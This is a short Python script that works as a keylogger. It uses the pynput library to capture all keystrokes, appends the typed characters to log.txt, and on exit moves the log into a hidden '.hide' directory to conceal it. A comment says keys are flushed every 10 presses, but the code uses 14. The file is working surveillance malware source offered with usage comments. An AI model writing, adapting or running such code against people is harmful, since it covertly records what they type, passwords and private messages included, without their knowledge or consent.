import pynput
import os
import shutil
from pynput.keyboard import Key, Listener

count = 0
keylist = []

#On key press, add the key to a key list. For every 10 keys, write to file and clear key list
def on_press(key): 
    global keylist, count
    keylist.append(key)
    count +=1
    if (count >= 14):
        write_to_file(keylist)
        count = 0
        keylist = []

    #print("{0} pressed".format(key)) // uncomment this line if you want to see what keys are being pressed on terminal

#On release check if the key was esc, to exit the program
def on_release(key):
    if key == Key.esc:
        return False

#When writing to file, append to the current file, if key = space or tab, then write a new line in the log file.
def write_to_file(keylist):
    with open("log.txt", "a") as f:
        for key in keylist:
            k = str(key).replace("'", "")
            if (k.find("space") > 0 or k.find("tab")>0):
                f.write('\n')
            elif (k.find("Key")== -1): #ignores keys that start with "Key."...(Key.tab, Key.shift, etc), write everything else
                 f.write(k)
        f.close()



with Listener (on_press=on_press, on_release= on_release) as listen:
    #print("Listening for key presses: ") //uncomment this line if you want terminal to let you know program is listening
    listen.join()

#Makes a hidden directory and stores the log file in that directory
os.mkdir(".hide")
source = "log.txt"
destination = ".hide"
shutil.move(source,destination)

